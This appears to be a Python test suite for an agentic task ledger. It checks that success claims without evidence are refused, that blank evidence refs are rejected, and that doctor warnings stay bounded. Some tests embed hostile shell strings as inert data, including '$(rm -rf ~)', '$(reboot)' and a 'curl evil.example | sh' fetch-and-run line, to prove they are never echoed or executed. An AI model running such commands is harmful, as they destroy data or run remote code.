"""v0.2 U-H2 success-proof tests (agentic-os-v0.2-u-h2-success-proof-contract.md).

Evidence-bearing structured success claims: a dropfile declaring
`outcome: success` must carry at least one acceptable evidence row in the
same file or ingest refuses atomically before its transaction; blank
evidence refs and explicitly blank claims refuse at the parser and at the
trusted CLI write; doctor gains two warn-only views (success runs with no
evidence attributable inside the run-bounded recovery window, and legacy
blank-ref evidence rows); U-H1 stays transport-only. Every refusal test
proves zero partial state and no echo of model-controlled values.

Every test runs against temporary directories; no real workspace, ledger,
or settings file is ever touched.
"""

from __future__ import annotations

import contextlib
import io
import json
import shutil
import sqlite3
import subprocess
import tempfile
import unittest
from pathlib import Path
from unittest import mock

from weekend_harness import Night1BackCompatCase, run_cli

from agentic_os import hooks, ingest, render, utils
from agentic_os.utils import AosError

REPO_ROOT = Path(__file__).resolve().parent.parent
GIT_BIN = shutil.which("git")

SID = "aabbccdd-1111-2222-3333-444455556666"

NBSP = " "
IDEO = "　"  # IDEOGRAPHIC SPACE

GATE_MARKER = "Refusing to ingest success dropfile"
WINDOW_CHECK = "success runs without attributable evidence"
BLANK_CHECK = "evidence rows with blank refs"

#: The protocol rule H pins (one concise sentence in the shared section).
PROTOCOL_RULE = (
    "A dropfile with `outcome: success` must list at least one non-blank "
    "evidence\nrow; ingest refuses a success dropfile whose evidence "
    "section is empty.\n`partial`, `fail`, and `unknown` remain valid "
    "with no evidence."
)


def dropfile(
    task: str = "T-0002",
    agent: str = "codex",
    outcome: str = "success",
    summary: str = "Scenario summary.",
    evidence: list[str] | None = None,
    questions: list[str] | None = None,
) -> str:
    lines = [
        "# AOS DROPFILE",
        f"task: {task}",
        f"agent: {agent}",
        f"outcome: {outcome}",
        f"summary: {summary}",
        "",
        "## evidence",
    ]
    lines += evidence if evidence is not None else []
    lines += ["", "## open questions"]
    lines += questions if questions is not None else []
    return "\n".join(lines) + "\n"


def evidence_fixture(bullet: str) -> str:
    """Byte-exact parser fixture: the evidence bullet sits at line 8."""
    return (
        "# AOS DROPFILE\n"
        "task: T-0002\n"
        "agent: codex\n"
        "outcome: success\n"
        "summary: parser fixture\n"
        "\n"
        "## evidence\n"
        f"{bullet}\n"
        "\n"
        "## open questions\n"
    )


def run_hook(argv: list[str], data: dict) -> tuple[int, str, str]:
    stdin = json.dumps(data).encode("utf-8")
    out, err = io.StringIO(), io.StringIO()
    with contextlib.redirect_stdout(out), contextlib.redirect_stderr(err):
        code = hooks.main(argv, stdin_bytes=stdin)
    return code, out.getvalue(), err.getvalue()


class SuccessProofCase(Night1BackCompatCase):
    """Night-1 workspace + direct-SQL seeding helpers (the established
    doctor-test pattern for states the CLI cannot or must not create)."""

    def write_dropfile(self, content: str, name: str = "uh2-drop.md") -> Path:
        path = self.root / name
        path.write_text(content, encoding="utf-8")
        return path

    def row_counts(self) -> dict[str, int]:
        conn = sqlite3.connect(self.db_path)
        try:
            return {
                table: conn.execute(
                    f"SELECT COUNT(*) AS n FROM {table}"
                ).fetchone()[0]
                for table in ("evidence", "runs", "handoffs", "events")
            }
        finally:
            conn.close()

    def seed_row(self, sql: str, params: tuple) -> int:
        conn = sqlite3.connect(self.db_path)
        try:
            with conn:
                return conn.execute(sql, params).lastrowid
        finally:
            conn.close()

    def seed_run(
        self,
        *,
        task_id: int = 2,
        started: str,
        ended: str | None = None,
        outcome: str | None = None,
        agent: str = "codex",
        summary: str | None = None,
    ) -> int:
        return self.seed_row(
            "INSERT INTO runs (task_id, agent, started_at, ended_at, "
            "outcome, summary_md) VALUES (?, ?, ?, ?, ?, ?)",
            (task_id, agent, started, ended, outcome, summary),
        )

    def seed_evidence(
        self,
        *,
        task_id: int = 2,
        created: str,
        ref: str = "seeded-proof",
        claim: str | None = None,
    ) -> int:
        return self.seed_row(
            "INSERT INTO evidence (task_id, kind, ref, claim, provenance, "
            "created_at) VALUES (?, 'note', ?, ?, 'human', ?)",
            (task_id, ref, claim, created),
        )

    def doctor_ok(self) -> str:
        code, out, err = self.run_cli("--root", str(self.root), "doctor")
        self.assertEqual(code, 0, out + err)
        return out

    def check_line(self, out: str, name: str) -> str:
        lines = [l for l in out.splitlines() if f"] {name}" in l]
        self.assertEqual(len(lines), 1, out)
        return lines[0]

    def ingest_event_count(self) -> int:
        conn = sqlite3.connect(self.db_path)
        try:
            return conn.execute(
                "SELECT COUNT(*) AS n FROM events WHERE entity = 'system' "
                "AND action = 'dropfile_ingest'"
            ).fetchone()[0]
        finally:
            conn.close()


# ---------------------------------------------------------------------------
# 1. Ingest success gate


class TestIngestSuccessGate(SuccessProofCase):
    def test_success_with_empty_evidence_refuses_atomically(self):
        before = self.row_counts()
        path = self.write_dropfile(dropfile(evidence=[]))
        code, out, err = self.aos_fails("ingest", "dropfile", str(path))
        self.assertEqual(out, "")  # stdout byte-empty on refusal
        self.assertIn(GATE_MARKER, err)
        self.assertIn("T-0002", err)
        self.assertIn("'partial', 'fail', or 'unknown'", err)
        self.assertIn("Nothing was ingested", err)
        # Zero partial state: no evidence, run, handoff, event — and no
        # dedupe marker, so a corrected retry is never "duplicate".
        self.assertEqual(self.row_counts(), before)
        self.assertEqual(self.ingest_event_count(), 0)

    def test_success_with_one_acceptable_row_ingests_and_ends_the_run(self):
        self.aos("run", "start", "T-0002", "--agent", "codex")
        path = self.write_dropfile(
            dropfile(evidence=["- kind: test | ref: unittest -q | claim: green"])
        )
        out = self.aos("ingest", "dropfile", str(path))
        self.assertIn("outcome: success", out)
        self.assertIn("run ended: R-0002 → success", out)
        detail = json.loads(self.aos("task", "show", "T-0002", "--json"))
        self.assertEqual(
            [(e["kind"], e["ref"], e["claim"]) for e in detail["evidence"]],
            [("test", "unittest -q", "green")],
        )

    def test_success_with_multiple_acceptable_rows_ingests(self):
        path = self.write_dropfile(
            dropfile(
                summary="multiple rows",
                evidence=[
                    "- kind: note | ref: proof-a | claim: first",
                    "- kind: url | ref: https://example.test/b | claim: second",
                ],
            )
        )
        out = self.aos("ingest", "dropfile", str(path))
        self.assertIn("evidence: E-0002, E-0003", out)

    def test_non_success_outcomes_accept_empty_evidence(self):
        for outcome in ("partial", "fail", "unknown"):
            with self.subTest(outcome=outcome):
                path = self.write_dropfile(
                    dropfile(outcome=outcome, summary=f"{outcome} run",
                             evidence=[]),
                    name=f"drop-{outcome}.md",
                )
                out = self.aos("ingest", "dropfile", str(path))
                self.assertIn(f"(outcome: {outcome})", out)
                self.assertIn("evidence: (none)", out)

    def test_success_evidence_with_zero_open_runs_still_ingests(self):
        runs_before = self.row_counts()["runs"]
        path = self.write_dropfile(
            dropfile(evidence=["- kind: note | ref: zero-runs | claim: ok"])
        )
        out = self.aos("ingest", "dropfile", str(path))
        self.assertIn("runs: 0 open for codex — no run created or ended", out)
        self.assertEqual(self.row_counts()["runs"], runs_before)

    def test_success_evidence_with_multiple_open_runs_ends_nothing(self):
        self.aos("run", "start", "T-0002", "--agent", "codex")
        self.aos("task", "status", "T-0002", "ready")
        self.aos("run", "start", "T-0002", "--agent", "codex")
        path = self.write_dropfile(
            dropfile(evidence=["- kind: note | ref: two-runs | claim: ok"])
        )
        out = self.aos("ingest", "dropfile", str(path))
        self.assertIn("runs: 2 open for codex — no run created or ended", out)
        detail = json.loads(self.aos("task", "show", "T-0002", "--json"))
        self.assertTrue(all(r["ended_at"] is None for r in detail["runs"]))

    def test_corrected_retry_after_refusal_succeeds(self):
        bad = self.write_dropfile(dropfile(evidence=[]), name="attempt.md")
        self.aos_fails("ingest", "dropfile", str(bad))
        corrected = self.write_dropfile(
            dropfile(evidence=["- kind: note | ref: corrected | claim: ok"]),
            name="attempt.md",
        )
        out = self.aos("ingest", "dropfile", str(corrected))
        self.assertIn("Ingested dropfile for T-0002", out)

    def test_legacy_already_ingested_file_reaches_duplicate_first(self):
        # A pre-U-H2 ledger may already carry the ingest event for a
        # success/empty-evidence file; re-ingesting those bytes must hit
        # the dedupe refusal, not the success gate (pinned precedence).
        content = dropfile(evidence=[])
        sha = utils.sha256_text(content)
        self.seed_row(
            "INSERT INTO events (ts, actor, entity, entity_id, action, "
            "payload_json) VALUES (?, 'agent:codex', 'system', NULL, "
            "'dropfile_ingest', ?)",
            (utils.utc_now_iso(), json.dumps({"sha256": sha})),
        )
        path = self.write_dropfile(content)
        code, out, err = self.aos_fails("ingest", "dropfile", str(path))
        self.assertIn("Duplicate dropfile", err)
        self.assertNotIn(GATE_MARKER, err)

    def test_refusal_diagnostic_echoes_no_model_controlled_value(self):
        path = self.write_dropfile(
            dropfile(
                agent="hostile-agent-x9",
                summary="summarymarker9000 success $(rm -rf ~)",
                evidence=[],
                questions=["- questionmarker9000 should we retry?"],
            )
        )
        code, out, err = self.aos_fails("ingest", "dropfile", str(path))
        self.assertEqual(out, "")
        self.assertIn("T-0002", err)  # validated/rendered task id only
        for marker in (
            "hostile-agent-x9", "summarymarker9000", "questionmarker9000",
            "$(rm -rf ~)",
        ):
            self.assertNotIn(marker, err)
            self.assertNotIn(marker, out)


# ---------------------------------------------------------------------------
# 2. Parser hardening (byte-exact fixtures; the bullet sits at line 8)


class TestParserHardening(unittest.TestCase):
    def assert_refuses_at_line_8(self, bullet: str, reason: str) -> str:
        with self.assertRaises(AosError) as ctx:
            ingest.parse_dropfile(evidence_fixture(bullet))
        message = str(ctx.exception)
        self.assertIn("Malformed dropfile at line 8", message)
        self.assertIn(reason, message)
        return message

    def test_padded_blank_ref_reaches_the_ref_branch(self):
        message = self.assert_refuses_at_line_8(
            "- kind: note | ref:   | claim: c",
            "evidence ref must not be blank",
        )
        # The dedicated ref branch, not the bullet-shape mismatch:
        self.assertNotIn("expected '- kind:", message)

    def test_nbsp_only_ref_reaches_the_ref_branch(self):
        self.assert_refuses_at_line_8(
            f"- kind: note | ref: {NBSP} | claim: c",
            "evidence ref must not be blank",
        )

    def test_u3000_only_ref_reaches_the_ref_branch(self):
        self.assert_refuses_at_line_8(
            f"- kind: note | ref: {IDEO} | claim: c",
            "evidence ref must not be blank",
        )

    def test_explicitly_blank_claim_refuses_as_a_malformed_evidence_line(self):
        # Contract U-H2.3, pinned honestly: a whitespace-only claim is
        # right-stripped off the line before the bullet regex runs, so the
        # refusal is the evidence-line SHAPE branch at the same line — an
        # evidence-field refusal, not an unrelated parser error (the file
        # is otherwise perfectly formed).
        for label, bullet in (
            ("ascii-space", "- kind: note | ref: r | claim: "),
            ("nbsp", f"- kind: note | ref: r | claim: {NBSP}"),
            ("u3000", f"- kind: note | ref: r | claim: {IDEO}"),
        ):
            with self.subTest(claim=label):
                message = self.assert_refuses_at_line_8(
                    bullet, "expected '- kind: K | ref: R | claim: C'"
                )
                self.assertNotIn("open questions", message)

    def test_valid_unicode_ref_and_claim_parse_and_survive(self):
        doc = ingest.parse_dropfile(
            evidence_fixture("- kind: note | ref: 证据/ref-α ✓ | claim: façade 通过")
        )
        self.assertEqual(
            doc["evidence"], [("note", "证据/ref-α ✓", "façade 通过")]
        )

    def test_blank_values_never_echo_in_the_diagnostic(self):
        # The diagnostic names line number and field only. Prove no
        # fragment of the (whitespace) value or its neighbors is echoed.
        with self.assertRaises(AosError) as ctx:
            ingest.parse_dropfile(
                evidence_fixture(f"- kind: note | ref: {NBSP} | claim: secretish")
            )
        self.assertNotIn(NBSP, str(ctx.exception))
        self.assertNotIn("secretish", str(ctx.exception))


# ---------------------------------------------------------------------------
# 3. Trusted CLI evidence writes


class TestCliEvidence(SuccessProofCase):
    def test_blank_ref_refuses_atomically(self):
        before = self.row_counts()
        code, out, err = self.aos_fails(
            "evidence", "add", "T-0002", "--kind", "note", "--ref", "   "
        )
        self.assertIn("Evidence --ref must not be blank.", err)
        self.assertEqual(self.row_counts(), before)  # no row, no event

    def test_unicode_whitespace_only_ref_refuses(self):
        before = self.row_counts()
        for label, ref in (
            ("nbsp", NBSP), ("u3000", IDEO), ("mixed", f" {NBSP}{IDEO} ")
        ):
            with self.subTest(ref=label):
                code, out, err = self.aos_fails(
                    "evidence", "add", "T-0002", "--kind", "note",
                    "--ref", ref,
                )
                self.assertIn("Evidence --ref must not be blank.", err)
        self.assertEqual(self.row_counts(), before)

    def test_supplied_blank_claim_refuses_atomically(self):
        before = self.row_counts()
        for label, claim in (("spaces", "  "), ("nbsp", NBSP)):
            with self.subTest(claim=label):
                code, out, err = self.aos_fails(
                    "evidence", "add", "T-0002", "--kind", "note",
                    "--ref", "real proof", "--claim", claim,
                )
                self.assertIn(
                    "Evidence --claim must not be blank when supplied", err
                )
        self.assertEqual(self.row_counts(), before)

    def test_omitted_claim_remains_valid(self):
        self.aos(
            "evidence", "add", "T-0002", "--kind", "note",
            "--ref", "claimless proof",
        )
        detail = json.loads(self.aos("task", "show", "T-0002", "--json"))
        self.assertEqual(detail["evidence"][0]["ref"], "claimless proof")
        self.assertIsNone(detail["evidence"][0]["claim"])

    def test_file_evidence_still_hashes(self):
        artifact = self.root / "artifact.txt"
        artifact.write_text("proof bytes\n", encoding="utf-8")
        self.aos(
            "evidence", "add", "T-0002", "--kind", "file",
            "--ref", str(artifact),
        )
        detail = json.loads(self.aos("task", "show", "T-0002", "--json"))
        self.assertEqual(
            detail["evidence"][0]["sha256"], utils.sha256_file(artifact)
        )

    @unittest.skipUnless(GIT_BIN, "git executable unavailable")
    def test_git_evidence_still_works_and_inherits_the_claim_guard(self):
        repo = self.new_tmp_dir("uh2 git repo")
        def git(*args: str) -> None:
            subprocess.run(
                [GIT_BIN, "-C", str(repo), *args],
                check=True, capture_output=True, text=True, timeout=10,
            )
        git("init", "-q")
        (repo / "file.txt").write_text("hello\n", encoding="utf-8")
        git("add", "file.txt")
        git(
            "-c", "user.email=t@t", "-c", "user.name=T",
            "commit", "-q", "-m", "uh2 commit subject",
        )
        sha = subprocess.run(
            [GIT_BIN, "-C", str(repo), "rev-parse", "HEAD"],
            check=True, capture_output=True, text=True, timeout=10,
        ).stdout.strip()
        # Unchanged: full sha stored, subject becomes the claim.
        self.aos("evidence", "git", "T-0002", "HEAD", "--repo", str(repo))
        detail = json.loads(self.aos("task", "show", "T-0002", "--json"))
        self.assertEqual(detail["evidence"][0]["ref"], sha)
        self.assertEqual(detail["evidence"][0]["claim"], "uh2 commit subject")
        # The shared add_evidence guard covers `evidence git` too:
        code, out, err = self.aos_fails(
            "evidence", "git", "T-0002", "HEAD", "--repo", str(repo),
            "--claim", "  ",
        )
        self.assertIn("Evidence --claim must not be blank", err)


# ---------------------------------------------------------------------------
# 4. Doctor: success-run attribution window
#
# Fixture note: the Night-1 workspace already carries R-0001 (task 1, ended
# success) with attributable evidence E-0001, so it must stay unflagged in
# every scenario below; seeded runs live on task 2 (no fixture evidence).


class TestDoctorRunWindow(SuccessProofCase):
    T0 = "2026-01-01T10:00:00Z"

    def test_success_run_with_zero_evidence_warns_run_id_only(self):
        run_id = self.seed_run(
            started=self.T0, ended="2026-01-01T10:05:00Z", outcome="success"
        )
        out = self.doctor_ok()  # warn-only: exit stays 0
        line = self.check_line(out, WINDOW_CHECK)
        self.assertTrue(line.startswith("[WARN]"), line)
        self.assertIn("1 run(s): R-0002", line)
        self.assertNotIn("R-0001", line)  # the proven fixture run
        self.assertEqual(run_id, 2)

    def test_evidence_created_before_the_run_does_not_count(self):
        self.seed_evidence(created="2026-01-01T09:59:59Z", ref="early")
        self.seed_run(
            started=self.T0, ended="2026-01-01T10:05:00Z", outcome="success"
        )
        line = self.check_line(self.doctor_ok(), WINDOW_CHECK)
        self.assertTrue(line.startswith("[WARN]"), line)
        self.assertIn("R-0002", line)

    def test_evidence_during_the_run_counts(self):
        self.seed_run(
            started=self.T0, ended="2026-01-01T10:05:00Z", outcome="success"
        )
        self.seed_evidence(created="2026-01-01T10:02:00Z")
        line = self.check_line(self.doctor_ok(), WINDOW_CHECK)
        self.assertTrue(line.startswith("[PASS]"), line)

    def test_same_second_start_evidence_end_counts(self):
        self.seed_run(started=self.T0, ended=self.T0, outcome="success")
        self.seed_evidence(created=self.T0)
        line = self.check_line(self.doctor_ok(), WINDOW_CHECK)
        self.assertTrue(line.startswith("[PASS]"), line)

    def test_post_end_evidence_heals_until_the_next_run_starts(self):
        self.seed_run(
            started=self.T0, ended="2026-01-01T10:05:00Z", outcome="success"
        )
        self.seed_evidence(created="2026-01-01T10:07:00Z")
        self.seed_run(started="2026-01-01T10:10:00Z")  # next run, open
        line = self.check_line(self.doctor_ok(), WINDOW_CHECK)
        self.assertTrue(line.startswith("[PASS]"), line)

    def test_evidence_after_the_next_run_started_does_not_heal(self):
        self.seed_run(
            started=self.T0, ended="2026-01-01T10:05:00Z", outcome="success"
        )
        self.seed_run(started="2026-01-01T10:10:00Z")  # next run, open
        self.seed_evidence(created="2026-01-01T10:15:00Z")
        line = self.check_line(self.doctor_ok(), WINDOW_CHECK)
        self.assertTrue(line.startswith("[WARN]"), line)
        self.assertIn("R-0002", line)   # the earlier run stays unproven
        self.assertNotIn("R-0003", line)  # the open next run is never judged

    def test_shared_started_at_uses_the_conservative_boundary(self):
        # Two sequential runs share one second-precision started_at; the
        # shared-timestamp evidence cannot heal the earlier run (empty
        # window under the strict bound) but does prove the later one,
        # pinning the (started_at, id) total order.
        self.seed_run(started=self.T0, ended=self.T0, outcome="success")
        self.seed_run(
            started=self.T0, ended="2026-01-01T10:05:00Z", outcome="success"
        )
        self.seed_evidence(created=self.T0)
        line = self.check_line(self.doctor_ok(), WINDOW_CHECK)
        self.assertTrue(line.startswith("[WARN]"), line)
        self.assertIn("1 run(s): R-0002", line)
        self.assertNotIn("R-0003", line)

    def test_non_success_and_open_runs_are_not_flagged(self):
        for offset, outcome in (
            ("11", "partial"), ("12", "fail"), ("13", "unknown")
        ):
            self.seed_run(
                started=f"2026-01-01T{offset}:00:00Z",
                ended=f"2026-01-01T{offset}:00:30Z",
                outcome=outcome,
            )
        self.seed_run(started="2026-01-01T14:00:00Z")  # open, no outcome
        line = self.check_line(self.doctor_ok(), WINDOW_CHECK)
        self.assertTrue(line.startswith("[PASS]"), line)

    def test_blank_ref_evidence_proves_nothing(self):
        self.seed_run(
            started=self.T0, ended="2026-01-01T10:05:00Z", outcome="success"
        )
        self.seed_evidence(created="2026-01-01T10:02:00Z", ref=NBSP)
        out = self.doctor_ok()
        window = self.check_line(out, WINDOW_CHECK)
        self.assertTrue(window.startswith("[WARN]"), window)
        self.assertIn("R-0002", window)
        # ...and the same row surfaces on the legacy blank-ref line.
        blank = self.check_line(out, BLANK_CHECK)
        self.assertTrue(blank.startswith("[WARN]"), blank)
        self.assertIn("E-0002", blank)

    def test_more_than_ten_offenders_produce_bounded_output(self):
        for minute in range(11):
            self.seed_run(
                started=f"2026-01-01T10:{minute:02d}:00Z",
                ended=f"2026-01-01T10:{minute:02d}:30Z",
                outcome="success",
            )
        line = self.check_line(self.doctor_ok(), WINDOW_CHECK)
        self.assertIn("11 run(s):", line)
        for n in range(2, 12):  # R-0002 … R-0011 shown
            self.assertIn(f"R-{n:04d}", line)
        self.assertNotIn("R-0012", line)  # the 11th offender is counted only
        self.assertIn("(+1 more)", line)

    def test_hostile_ledger_values_are_never_echoed(self):
        self.seed_evidence(
            created="2026-01-01T09:00:00Z",  # before the run: proves nothing
            ref="hostilerefmarker9000 $(touch pwned)",
            claim="hostileclaimmarker9000 `id`",
        )
        self.seed_run(
            started=self.T0,
            ended="2026-01-01T10:05:00Z",
            outcome="success",
            agent="hostileagentmarker9000",
            summary="hostilesummarymarker9000 success passed done",
        )
        out = self.doctor_ok()
        line = self.check_line(out, WINDOW_CHECK)
        self.assertTrue(line.startswith("[WARN]"), line)
        self.assertIn("R-0002", line)
        for marker in (
            "hostilerefmarker9000", "hostileclaimmarker9000",
            "hostileagentmarker9000", "hostilesummarymarker9000",
            "$(touch pwned)",
        ):
            self.assertNotIn(marker, out)  # the whole doctor output

    def test_doctor_warning_keeps_exit_zero_and_never_fails(self):
        self.seed_run(
            started=self.T0, ended="2026-01-01T10:05:00Z", outcome="success"
        )
        out = self.doctor_ok()  # asserts exit 0
        self.assertNotIn("[FAIL]", out)


# ---------------------------------------------------------------------------
# 5. Doctor: legacy blank-ref evidence


class TestDoctorLegacyBlankRefs(SuccessProofCase):
    def test_blank_legacy_row_is_named_by_id_only(self):
        self.seed_evidence(
            created=utils.utc_now_iso(), ref=f" {NBSP} ",
            claim="legacyclaimmarker9000",
        )
        out = self.doctor_ok()
        line = self.check_line(out, BLANK_CHECK)
        self.assertTrue(line.startswith("[WARN]"), line)
        self.assertIn("1 row(s): E-0002", line)
        self.assertNotIn("legacyclaimmarker9000", out)
        # The row is reported, never rewritten or deleted:
        conn = sqlite3.connect(self.db_path)
        try:
            row = conn.execute(
                "SELECT ref, claim FROM evidence WHERE id = 2"
            ).fetchone()
        finally:
            conn.close()
        self.assertEqual(row[0], f" {NBSP} ")
        self.assertEqual(row[1], "legacyclaimmarker9000")

    def test_non_blank_evidence_is_not_flagged(self):
        line = self.check_line(self.doctor_ok(), BLANK_CHECK)
        self.assertTrue(line.startswith("[PASS]"), line)
        self.assertNotIn("E-0001", line)

    def test_more_than_ten_rows_produce_bounded_output(self):
        for _ in range(11):
            self.seed_evidence(created=utils.utc_now_iso(), ref=NBSP)
        line = self.check_line(self.doctor_ok(), BLANK_CHECK)
        self.assertIn("11 row(s):", line)
        for n in range(2, 12):  # E-0002 … E-0011 shown
            self.assertIn(f"E-{n:04d}", line)
        self.assertNotIn("E-0012", line)
        self.assertIn("(+1 more)", line)


# ---------------------------------------------------------------------------
# 6. Non-regression: U-H1 transport boundary, parity, no classification


class TestUH1TransportBoundary(unittest.TestCase):
    """The hooks stay transport-only: a structurally valid success envelope
    with an EMPTY evidence section still stages and publishes (D-v0.2.29);
    U-H2 refuses exactly that file at ingest, atomically."""

    def setUp(self):
        tmp = tempfile.TemporaryDirectory()
        self.addCleanup(tmp.cleanup)
        self.tmp = Path(tmp.name).resolve()
        self.root = self.tmp / "workspace"
        self.root.mkdir()
        repo = self.tmp / "repo"
        repo.mkdir()
        self.aos = lambda *argv: run_cli("--root", str(self.root), *argv)
        code, out, err = self.aos("init")
        self.assertEqual(code, 0, err)
        self.aos("project", "add", "demo", "--name", "Demo", "--repo", str(repo))
        self.aos("task", "add", "Transport boundary", "-p", "demo")
        self.exports = self.root / ".agentic-os" / "exports"
        self.transcript = self.tmp / "transcript.jsonl"
        self.transcript.write_text("{}\n", encoding="utf-8")
        self.db_path = self.root / ".agentic-os" / "aos.db"

    def row_counts(self) -> dict[str, int]:
        conn = sqlite3.connect(self.db_path)
        try:
            return {
                table: conn.execute(
                    f"SELECT COUNT(*) AS n FROM {table}"
                ).fetchone()[0]
                for table in ("evidence", "runs", "handoffs", "events")
            }
        finally:
            conn.close()

    def test_hook_publishes_success_empty_envelope_and_ingest_refuses(self):
        body = dropfile(task="T-0001", agent="claude-code", evidence=[])
        message = f"All done.\n\n```aos-dropfile\n{body}```\n"
        code, out, err = run_hook(["stop"], {
            "session_id": SID,
            "cwd": str(self.root),
            "hook_event_name": "Stop",
            "last_assistant_message": message,
            "stop_hook_active": False,
            "background_tasks": [],
            "session_crons": [],
        })
        self.assertEqual((code, out), (0, ""), err)
        code, out, err = run_hook(["session-end"], {
            "session_id": SID,
            "cwd": str(self.root),
            "hook_event_name": "SessionEnd",
            "transcript_path": str(self.transcript),
            "reason": "other",
        })
        self.assertEqual((code, out), (0, ""), err)
        published = sorted(self.exports.glob("dropfile-*.md"))
        self.assertEqual(len(published), 1)  # U-H1 published it unchanged
        self.assertEqual(
            published[0].read_bytes(), body.encode("utf-8")
        )
        # …and U-H2 refuses it at ingest, atomically.
        before = self.row_counts()
        code, out, err = self.aos("ingest", "dropfile", str(published[0]))
        self.assertEqual(code, 1, err)
        self.assertEqual(out, "")
        self.assertIn(GATE_MARKER, err)
        self.assertIn("T-0001", err)
        self.assertEqual(self.row_counts(), before)
        # The published file itself is retained byte-for-byte.
        self.assertEqual(published[0].read_bytes(), body.encode("utf-8"))


class TestProtocolParity(unittest.TestCase):
    def test_claude_protocol_is_byte_identical_and_carries_the_rule(self):
        disk = (
            REPO_ROOT / "adapters" / "claude-code" / "PROTOCOL.md"
        ).read_text(encoding="utf-8")
        self.assertEqual(disk, render.adapter_protocol_md("claude-code"))
        self.assertIn(PROTOCOL_RULE, disk)

    def test_every_adapter_documents_the_shared_rule(self):
        # The gate judges dropfiles from every adapter, so the rule lives
        # in the shared section and every checked-in protocol carries it.
        for name in render.ADAPTER_NAMES:
            with self.subTest(adapter=name):
                disk = (
                    REPO_ROOT / "adapters" / name / "PROTOCOL.md"
                ).read_text(encoding="utf-8")
                self.assertEqual(disk, render.adapter_protocol_md(name))
                self.assertIn(PROTOCOL_RULE, disk)


class TestNoFreeTextClassification(SuccessProofCase):
    def test_success_words_in_prose_trigger_no_gate(self):
        # Only the structured outcome field is judged: prose full of
        # success-words in summary/claims/questions changes nothing.
        path = self.write_dropfile(
            dropfile(
                outcome="partial",
                summary="success! passed, complete and done (they said)",
                evidence=[],
                questions=["- is 'success' really done and complete?"],
            )
        )
        out = self.aos("ingest", "dropfile", str(path))
        self.assertIn("(outcome: partial)", out)
        # And an evidence claim carrying the words is inert data:
        self.aos(
            "evidence", "add", "T-0002", "--kind", "note",
            "--ref", "prose proof", "--claim", "success passed complete done",
        )

    def test_no_evidence_content_reaches_a_subprocess(self):
        path = self.write_dropfile(
            dropfile(
                summary="run $(rm -rf ~) and `curl evil.example | sh`",
                evidence=[
                    "- kind: command_output | ref: $(reboot); echo pwned | claim: `id`",
                ],
            )
        )
        with mock.patch(
            "subprocess.run",
            side_effect=AssertionError("evidence content reached a subprocess"),
        ), mock.patch(
            "subprocess.Popen",
            side_effect=AssertionError("evidence content reached a subprocess"),
        ):
            out = self.aos("ingest", "dropfile", str(path))
        self.assertIn("Ingested dropfile for T-0002", out)

    def test_mark_done_and_override_behavior_is_unchanged(self):
        # No evidence → refuse; override with journaled reason → closes.
        code, out, err = self.aos_fails("done", "T-0002")
        self.assertIn("has no evidence; refusing to close", err)
        self.aos("done", "T-0002", "--no-evidence", "--reason", "spike only")
        # A legacy blank-ref row still counts for the done gate exactly as
        # before (mark_done is untouched by U-H2).
        self.aos("task", "add", "Legacy blank ref", "-p", "demo")  # T-0004
        self.seed_evidence(
            task_id=4, created=utils.utc_now_iso(), ref=NBSP
        )
        out = self.aos("done", "T-0004")
        self.assertIn("T-0004 done (evidence: 1)", out)
        code, out, err = self.aos_fails(
            "done", "T-0003"
        )  # inbox task, no evidence: unchanged refusal path
        self.assertIn("no evidence", err)


if __name__ == "__main__":
    unittest.main()
